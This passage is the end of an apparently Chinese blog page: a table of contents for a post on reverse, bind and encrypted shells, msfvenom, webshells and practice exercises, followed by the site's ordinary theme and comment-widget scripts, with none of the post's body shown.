Netcat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat%E5%BB%BA%E7%AB%8B%E5%8F%8D%E5%90%91shell"><span class="toc-text">Netcat建立反向shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat%E5%BB%BA%E7%AB%8B%E7%BB%91%E5%AE%9Ashell"><span class="toc-text">Netcat建立绑定shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-shell%E7%9A%84%E7%A8%B3%E5%AE%9A%E5%8C%96"><span class="toc-text">0x05 shell的稳定化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E5%B7%A71-python"><span class="toc-text">技巧1: Python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E5%B7%A72-rlwrap"><span class="toc-text">技巧2: rlwrap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E5%B7%A73-socat"><span class="toc-text">技巧3: Socat</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-socat"><span class="toc-text">0x06 Socat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse-shells%E5%8F%8D%E5%90%91shell"><span class="toc-text">Reverse Shells（反向shell）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bind-shells%E7%BB%91%E5%AE%9Ashell"><span class="toc-text">Bind Shells（绑定shell）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-socat%E5%8A%A0%E5%AF%86shell"><span class="toc-text">0x07 Socat加密shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E5%8F%8D%E5%90%91shell"><span class="toc-text">加密反向shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E7%BB%91%E5%AE%9Ashell"><span class="toc-text">加密绑定shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E5%B8%B8%E7%94%A8shell-payload"><span class="toc-text">0x08 常用shell payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-msfvenom%E7%94%9F%E6%88%90shell-payload"><span class="toc-text">0x09 Msfvenom生成shell payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x10-metasploit-multihandler%E6%A8%A1%E5%9D%97"><span class="toc-text">0x10 Metasploit multi&#x2F;handler模块</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x11-webshell%E4%BB%8B%E7%BB%8D"><span class="toc-text">0x11 webshell介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x12-%E8%8E%B7%E5%8F%96shell%E4%B9%8B%E5%90%8E%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="toc-text">0x12 获取shell之后的操作</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x13-%E7%BB%83%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5"><span class="toc-text">0x13 练习与实践</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux-practice-box"><span class="toc-text">Linux Practice Box</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A01"><span class="toc-text">练习1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A02"><span class="toc-text">练习2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A03"><span class="toc-text">练习3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A04"><span class="toc-text">练习4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A05"><span class="toc-text">练习5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A06"><span class="toc-text">练习6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A07"><span class="toc-text">练习7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A08"><span class="toc-text">练习8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A09"><span class="toc-text">练习9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A010"><span class="toc-text">练习10</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
